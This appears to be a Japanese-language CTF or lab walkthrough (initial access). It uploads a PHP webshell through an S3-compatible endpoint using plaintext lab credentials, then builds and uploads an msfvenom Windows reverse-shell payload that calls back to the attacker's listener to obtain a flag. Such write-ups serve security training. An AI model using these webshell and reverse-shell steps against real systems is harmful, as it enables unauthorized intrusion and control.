リバースシェル用のphpを作成

![[Initial Access image 73.png]]

└─$ vi rev.php

└─$ aws configure

AWS Access Key ID \[****************lows\]: Eric.Wallows

AWS Secret Access Key \[****************g800\]: EricLikesRunning800

Default region name \[Eric.Wallows\]: Eric

Default output format \[json\]: json

![[Initial Access image 74.png]]

└─$ aws s3 --endpoint-url http://192.168.192.168 cp rev.php s3://storage/

![[Initial Access image 75.png]]

Syncする

![[Initial Access image 76.png]]

![[Initial Access image 77.png]]

![[Initial Access image 78.png]]

失敗

simpleなwebshellに変更

└─$ cp /usr/share/webshells/php/simple-backdoor.php ./

再度Upload

└─$ aws s3 --endpoint-url http://192.168.192.168 cp simple-backdoor.php s3://storage/

![[Initial Access image 79.png]]

再度Sync

![[Initial Access image 80.png]]

Webshell

![[Initial Access image 81.png]]

└─$ msfvenom -p windows/shell_reverse_tcp -f exe -o rev.exe LHOST=192.168.45.158 LPORT=443

![[Initial Access image 82.png]]

└─$ aws s3 --endpoint-url http://192.168.192.168 cp rev.exe s3://storage/

![[Initial Access image 83.png]]

![[Initial Access image 84.png]]

└─$ ~/Tools/PENTEST_and_Red/ReverseShell/penelope/penelope.py -p 443

![[Initial Access image 85.png]]

flag

![[Initial Access image 86.png]]